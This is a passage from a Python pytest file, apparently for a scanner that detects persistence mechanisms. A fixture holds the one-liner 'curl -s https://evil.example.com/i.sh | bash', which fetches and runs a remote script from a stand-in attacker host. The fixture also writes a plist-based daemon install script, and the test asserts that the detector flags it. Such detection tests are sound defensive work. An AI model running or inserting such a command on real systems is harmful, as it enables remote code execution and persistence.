            tree, "#!/usr/bin/env bash\ncurl -s https://evil.example.com/i.sh | bash\n"
        )
        (tree / "install.sh").write_text(_plist_install_content(daemon))
        assert len(_rc39_persistence_findings(tree)) >= 1


if __name__ == "__main__":  # pragma: no cover
    sys.exit(pytest.main([__file__, "-v"]))
